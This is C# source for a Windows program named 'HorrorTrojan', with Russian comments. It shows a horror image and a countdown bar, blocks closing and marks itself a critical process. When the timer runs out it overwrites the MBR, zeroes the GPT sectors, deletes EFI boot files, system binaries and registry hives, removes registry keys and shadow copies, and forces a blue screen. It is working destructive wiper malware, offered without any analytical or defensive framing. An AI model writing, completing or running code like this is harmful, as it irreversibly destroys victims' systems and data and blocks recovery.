using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace HorrorTrojan
{
    public partial class MainInterface : Form
    {
        // ===== ПЕРЕМЕННЫЕ =====
        private System.Windows.Forms.Timer bloodTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer drawTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer topMostTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer protectTimer = new System.Windows.Forms.Timer();
        private Random rnd = new Random();
        private DateTime startTime;
        private int maxSeconds = 180;
        private int bloodLevel = 100;
        private Image horrorImage;
        private int indicatorWidth = 25;
        private int indicatorHeight = 280;
        private int indicatorX;
        private int indicatorY;
        private int imageWidth = 300;
        private int imageHeight = 350;
        private int imageX;
        private int imageY;
        private bool isDragging = false;
        private Point dragStartPoint;
        private Thread watchdogThread;
        private bool watchdogAlive = true;
        private DateTime lastPing = DateTime.Now;
        private SoundPlayer musicPlayer;
        private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
        private bool bsodTriggered = false;
        private bool musicInitialized = false;
        private bool timerCompleted = false;
        private bool destroying = false;

        // ===== NATIVE METHODS =====
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

        public MainInterface()
        {
            InitializeComponent();
            LoadHorrorImage();
            CalculateLayout();
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
        }

        private void InitializeComponent()
        {
            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = false;
            this.BackColor = Color.Maroon;
            this.TransparencyKey = Color.Maroon;
            this.ShowInTaskbar = false;
            this.ControlBox = false;
            this.DoubleBuffered = true;

            bloodTimer.Interval = 100;
            bloodTimer.Tick += BloodTimer_Tick;

            drawTimer.Interval = 100;
            drawTimer.Tick += DrawTimer_Tick;

            topMostTimer.Interval = 100;
            topMostTimer.Tick += (s, e) => { this.TopMost = false; };
            topMostTimer.Start();

            protectTimer.Interval = 100;
            protectTimer.Tick += ProtectTimer_Tick;

            this.Load += MainInterface_Load;
            this.Paint += MainInterface_Paint;
            this.FormClosing += MainInterface_FormClosing;
            this.MouseDown += MainInterface_MouseDown;
            this.MouseMove += MainInterface_MouseMove;
            this.MouseUp += MainInterface_MouseUp;
        }

        private void CalculateLayout()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            imageX = (screenWidth - imageWidth - indicatorWidth - 40) / 2;
            imageY = (screenHeight - imageHeight) / 2;
            indicatorX = imageX + imageWidth + 20;
            indicatorY = imageY + (imageHeight - indicatorHeight) / 2;
            int formWidth = imageX + imageWidth + indicatorWidth + 40;
            int formHeight = imageY + imageHeight + 20;
            this.Size = new Size(formWidth, formHeight);
        }

        private void LoadHorrorImage()
        {
            string path = @"C:\Windows\ProgramFiles\SystemUpdate\horror.png";
            if (System.IO.File.Exists(path))
                horrorImage = Image.FromFile(path);
            else
                horrorImage = new Bitmap(imageWidth, imageHeight);
        }

        private void InitializeMusic()
        {
            try
            {
                if (System.IO.File.Exists(musicPath) && !musicInitialized && !destroying)
                {
                    musicPlayer = new SoundPlayer(musicPath);
                    musicPlayer.Load();
                    musicPlayer.PlayLooping();
                    musicInitialized = true;
                }
            }
            catch { }
        }

        private void PlayMusic()
        {
            try
            {
                if (musicPlayer != null && !musicInitialized && !destroying)
                {
                    musicPlayer.PlayLooping();
                    musicInitialized = true;
                }
            }
            catch { }
        }

        private void StopMusic()
        {
            try
            {
                if (musicPlayer != null)
                {
                    musicPlayer.Stop();
                    musicInitialized = false;
                }
            }
            catch { }
        }

        private void SetupFullProtection()
        {
            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch { }

            watchdogThread = new Thread(WatchdogLoop);
            watchdogThread.IsBackground = true;
            watchdogThread.Start();
        }

        private void WatchdogLoop()
        {
            while (watchdogAlive && !destroying)
            {
                Thread.Sleep(500);
                try
                {
                    if ((DateTime.Now - lastPing).TotalSeconds > 3)
                    {
                        StopMusic();
                        if (!bsodTriggered) TriggerBSOD();
                        return;
                    }
                }
                catch
                {
                    StopMusic();
                    if (!bsodTriggered) TriggerBSOD();
                    return;
                }
            }
        }

        private void ProtectTimer_Tick(object sender, EventArgs e)
        {
            if (destroying) return;
            
            lastPing = DateTime.Now;

            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch
            {
                StopMusic();
                if (!bsodTriggered) TriggerBSOD();
            }

            try
            {
                this.TopMost = false;
            }
            catch { }
        }

        private void MainInterface_Load(object sender, EventArgs e)
        {
            // ===== ЗАПУСКАЕМ РАБОЧИЙ СТОЛ =====
            try
            {
                System.Diagnostics.Process.Start("explorer.exe");
            }
            catch { }

            startTime = DateTime.Now;
            InitializeMusic();
            bloodTimer.Start();
            drawTimer.Start();
            protectTimer.Start();
            PlayMusic();
            SetupFullProtection();
        }

        private void BloodTimer_Tick(object sender, EventArgs e)
        {
            if (destroying) return;
            
            try
            {
                TimeSpan elapsed = DateTime.Now - startTime;
                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
                
                if (double.IsNaN(percent) || double.IsInfinity(percent))
                    percent = 0;
                
                if (percent < 0) percent = 0;
                if (percent > 100) percent = 100;
                
                int newBloodLevel = 100 - (int)Math.Round(percent);
                if (newBloodLevel < 0) newBloodLevel = 0;
                if (newBloodLevel > 100) newBloodLevel = 100;
                
                bloodLevel = newBloodLevel;
                
                // ===== КОГДА ДОШЛИ ДО 0 =====
                if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
                {
                    if (!timerCompleted)
                    {
                        timerCompleted = true;
                        destroying = true;
                        
                        bloodTimer.Stop();
                        drawTimer.Stop();
                        protectTimer.Stop();
                        watchdogAlive = false;
                        StopMusic();
                        
                        // ===== УНИЧТОЖАЕМ ТОЛЬКО ПОСЛЕ ТАЙМЕРА =====
                        if (!bsodTriggered)
                        {
                            bsodTriggered = true;
                            DestroySystemAndBSOD();
                        }
                    }
                }
            }
            catch
            {
                if (!bsodTriggered)
                {
                    bsodTriggered = true;
                    DestroySystemAndBSOD();
                }
            }
        }

        // ===== УНИЧТОЖЕНИЕ СИСТЕМЫ (ТОЛЬКО ПО ТАЙМЕРУ) =====
        private void DestroySystemAndBSOD()
        {
            try
            {
                // ===== УНИЧТОЖАЕМ MBR, GPT, EFI, РЕЕСТР, ФАЙЛЫ =====
                DestroyEverything();
                
                // ===== ВЫЗЫВАЕМ BSOD (ГАРАНТИРОВАННО) =====
                TriggerBSOD();
            }
            catch
            {
                // Если что-то пошло не так — всё равно BSOD
                TriggerBSOD();
            }
        }

        private void DestroyEverything()
        {
            try
            {
                // ===== MBR (секторы 0-63) =====
                DestroyBootSectors();
                
                // ===== GPT (секторы 1-33) =====
                DestroyGPT();
                
                // ===== EFI =====
                DestroyEFI();
                
                // ===== СИСТЕМНЫЕ ФАЙЛЫ (НЕ ТРОГАЕМ КРИТИЧЕСКИЕ) =====
                DestroySystemFiles();
                
                // ===== РЕЕСТР =====
                DestroyRegistry();
                
                // ===== ТЕНЕВЫЕ КОПИИ =====
                DestroyShadowCopies();
            }
            catch { }
        }

        private void DestroyBootSectors()
        {
            try
            {
                byte[] mbr = ResourceExtractor.GetMBR();
                if (mbr.Length == 512)
                {
                    for (int sector = 0; sector < 64; sector++)
                    {
                        try
                        {
                            using (System.IO.FileStream fs = new System.IO.FileStream(@"\\.\PhysicalDrive0", System.IO.FileMode.Open, System.IO.FileAccess.Write))
                            {
                                fs.Seek(sector * 512, System.IO.SeekOrigin.Begin);
                                fs.Write(mbr, 0, 512);
                                fs.Flush();
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private void DestroyGPT()
        {
            try
            {
                byte[] zeros = new byte[512];
                for (int sector = 1; sector < 34; sector++)
                {
                    try
                    {
                        using (System.IO.FileStream fs = new System.IO.FileStream(@"\\.\PhysicalDrive0", System.IO.FileMode.Open, System.IO.FileAccess.Write))
                        {
                            fs.Seek(sector * 512, System.IO.SeekOrigin.Begin);
                            fs.Write(zeros, 0, 512);
                            fs.Flush();
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void DestroyEFI()
        {
            try
            {
                string[] efiPaths = new string[]
                {
                    @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
                    @"C:\EFI\Microsoft\Boot\bootmgr.efi",
                    @"C:\EFI\Boot\bootx64.efi",
                    @"C:\EFI\Microsoft\Recovery\boot.sdi",
                    @"C:\EFI\Microsoft\Boot\BCD",
                    @"C:\EFI\Microsoft\Boot\boot.sdi"
                };
                
                foreach (string path in efiPaths)
                {
                    try
                    {
                        if (System.IO.File.Exists(path))
                            System.IO.File.Delete(path);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void DestroySystemFiles()
        {
            try
            {
                // ===== УДАЛЯЕМ НЕКРИТИЧЕСКИЕ ФАЙЛЫ =====
                string[] systemFiles = new string[]
                {
                    @"C:\Windows\System32\winlogon.exe",
                    @"C:\Windows\System32\drivers\ntfs.sys",
                    @"C:\Windows\System32\drivers\disk.sys",
                    @"C:\Windows\System32\drivers\partmgr.sys",
                    @"C:\Windows\System32\config\SYSTEM",
                    @"C:\Windows\System32\config\SOFTWARE",
                    @"C:\Windows\System32\config\SAM",
                    @"C:\Windows\System32\config\SECURITY",
                    @"C:\Windows\System32\config\DEFAULT",
                    @"C:\bootmgr",
                    @"C:\Boot\BCD",
                    @"C:\Boot\boot.sdi",
                    @"C:\Boot\BCD.LOG",
                    @"C:\boot\bootstat.dat",
                    @"C:\Windows\System32\winload.exe",
                    @"C:\Windows\System32\winload.efi",
                    @"C:\Windows\System32\user32.dll",
                    @"C:\Windows\System32\gdi32.dll",
                    @"C:\Windows\System32\shell32.dll"
                };
                
                foreach (string path in systemFiles)
                {
                    try
                    {
                        if (System.IO.File.Exists(path))
                            System.IO.File.Delete(path);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void DestroyRegistry()
        {
            try
            {
                string[] registryKeys = new string[]
                {
                    @"SYSTEM\CurrentControlSet\Control\Session Manager",
                    @"SYSTEM\CurrentControlSet\Control\Lsa",
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                };
                
                foreach (string keyPath in registryKeys)
                {
                    try
                    {
                        Microsoft.Win32.Registry.LocalMachine.DeleteSubKeyTree(keyPath, false);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void DestroyShadowCopies()
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "vssadmin",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        // ===== BSOD (ГАРАНТИРОВАННО) =====
        private void TriggerBSOD()
        {
            try
            {
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
            }
            catch
            {
                // Если BSOD не сработал — принудительная перезагрузка
                try
                {
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "shutdown",
                        Arguments = "/r /f /t 0",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                catch { }
                
                Environment.Exit(1);
            }
        }

        private void DrawTimer_Tick(object sender, EventArgs e)
        {
            if (!destroying)
                this.Invalidate();
        }

        private void MainInterface_Paint(object sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.Clear(Color.Maroon);

            DrawImage(g);
            DrawBloodIndicator(g);
        }

        private void DrawImage(Graphics g)
        {
            if (horrorImage != null)
            {
                Rectangle rect = new Rectangle(imageX, imageY, imageWidth, imageHeight);
                g.DrawImage(horrorImage, rect);
            }
        }

        private void DrawBloodIndicator(Graphics g)
        {
            if (bloodLevel <= 0 || destroying) return;

            int fillHeight = (bloodLevel * indicatorHeight) / 100;
            if (fillHeight <= 0) return;

            int fillY = indicatorY + (indicatorHeight - fillHeight);

            int height = Math.Max(1, fillHeight - 2);
            int width = Math.Max(1, indicatorWidth - 2);

            Rectangle borderRect = new Rectangle(indicatorX, indicatorY, indicatorWidth, indicatorHeight);
            using (Pen borderPen = new Pen(Color.FromArgb(120, 100, 0, 0), 1))
            {
                g.DrawRectangle(borderPen, borderRect);
            }

            Rectangle fillRect = new Rectangle(
                indicatorX + 1,
                fillY + 1,
                width,
                height
            );

            using (LinearGradientBrush brush = new LinearGradientBrush(
                fillRect,
                Color.FromArgb(255, 200, 0, 0),
                Color.FromArgb(255, 60, 0, 0),
                LinearGradientMode.Vertical))
            {
                g.FillRectangle(brush, fillRect);
            }

            using (Pen glowPen = new Pen(Color.FromArgb(80, 255, 0, 0), 1))
            {
                g.DrawRectangle(glowPen, indicatorX + 1, indicatorY + 1, indicatorWidth - 2, indicatorHeight - 2);
            }
        }

        private void MainInterface_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void MainInterface_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                dragStartPoint = new Point(e.X, e.Y);
                this.Capture = true;
            }
        }

        private void MainInterface_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point screenPoint = PointToScreen(e.Location);
                this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
            }
        }

        private void MainInterface_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
                this.Capture = false;
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int SC_MINIMIZE = 0xF020;
            const int SC_MAXIMIZE = 0xF030;
            const int WM_KEYDOWN = 0x0100;

            if (m.Msg == WM_SYSCOMMAND)
            {
                if ((int)m.WParam == SC_CLOSE || (int)m.WParam == SC_MINIMIZE || (int)m.WParam == SC_MAXIMIZE)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }

            if (m.Msg == WM_KEYDOWN)
            {
                Keys key = (Keys)(int)m.WParam;
                if (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
                if (key == Keys.Escape || key == Keys.F10)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }

            base.WndProc(ref m);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80000;
                cp.ExStyle |= 0x20;
                return cp;
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                bloodTimer?.Dispose();
                drawTimer?.Dispose();
                topMostTimer?.Dispose();
                protectTimer?.Dispose();
                horrorImage?.Dispose();
                musicPlayer?.Dispose();
                watchdogAlive = false;
                destroying = true;
            }
            base.Dispose(disposing);
        }
    }
}
